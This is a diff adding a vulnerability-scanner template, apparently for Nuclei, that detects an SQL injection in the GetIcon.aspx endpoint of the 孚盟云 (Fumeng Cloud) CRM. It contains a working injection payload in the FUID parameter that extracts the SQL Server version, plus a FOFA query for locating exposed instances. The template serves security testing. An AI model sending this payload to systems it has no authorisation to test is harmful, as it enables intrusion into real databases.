@@ -1,0 +1,27 @@
+id: fumingyun-geticon-sqli
+
+info:
+  name: 孚盟云 GetIcon.aspx SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    孚盟云GetIcon.aspx接口存在SQL注入漏洞，攻击者可通过FUID参数获取数据库版本信息
+  metadata:
+    fofa-query: 'body="孚盟云" || body="/PageStructure/Mail/default.aspx"'
+  tags: Fumeng-Cloud-孚盟云
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Common/GetIcon.aspx?FUID=-1'and+1=@@VERSION--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Microsoft SQL Server"
+          - "转换成数据类型"
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 500 
